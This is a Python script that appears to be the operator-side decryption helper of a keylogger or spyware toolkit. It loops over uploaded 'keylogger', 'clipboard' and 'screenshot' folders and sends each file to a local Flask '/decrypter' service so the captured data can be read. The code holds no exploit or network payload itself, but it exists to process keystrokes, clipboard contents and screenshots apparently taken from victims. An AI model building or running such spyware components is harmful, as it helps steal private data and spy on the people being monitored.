import requests
import os

# Flask server URL
FLASK_SERVER_URL = 'http://localhost:5000/decrypter'

# Base directories
BASE_UPLOAD_FOLDER = 'Uploads'
KEYLOGGER_FOLDER = os.path.join(BASE_UPLOAD_FOLDER, 'keylogger')
CLIPBOARD_FOLDER = os.path.join(BASE_UPLOAD_FOLDER, 'clipboard')
SCREENSHOT_FOLDER = os.path.join(BASE_UPLOAD_FOLDER, 'screenshot')
DECRYPTED_FOLDER = 'DecryptedFiles'

def decrypt_file(file_path):
    """Call the Flask server to decrypt the file."""
    if not os.path.exists(file_path):
        print(f"Error: The file '{file_path}' does not exist.")
        return

    # Prepare the data to send in the POST request
    data = {'image_path': file_path}
    
    try:
        response = requests.post(FLASK_SERVER_URL, json=data)
        
        # Check the response status
        if response.status_code == 200:
            result = response.json()
            decrypted_file = result['decrypted_file']
            print(f"Decryption successful! Decrypted file saved as {decrypted_file}")
        else:
            result = response.json()
            print(f"Error during decryption: {result['error']}")
    
    except requests.RequestException as e:
        print(f"Request failed: {e}")

def process_folder(folder):
    """Process all files in the given folder."""
    if not os.path.exists(folder):
        print(f"Error: The folder '{folder}' does not exist.")
        return
    
    for file_name in os.listdir(folder):
        file_path = os.path.join(folder, file_name)
        if os.path.isfile(file_path):
            print(f"Processing file: {file_path}")
            decrypt_file(file_path)

if __name__ == "__main__":
    # Ensure the decrypted folder exists
    os.makedirs(DECRYPTED_FOLDER, exist_ok=True)
    
    # Process all folders
    print("Processing keylogger files...")
    process_folder(KEYLOGGER_FOLDER)
    
    print("Processing clipboard files...")
    process_folder(CLIPBOARD_FOLDER)
    
    print("Processing screenshot files...")
    process_folder(SCREENSHOT_FOLDER)
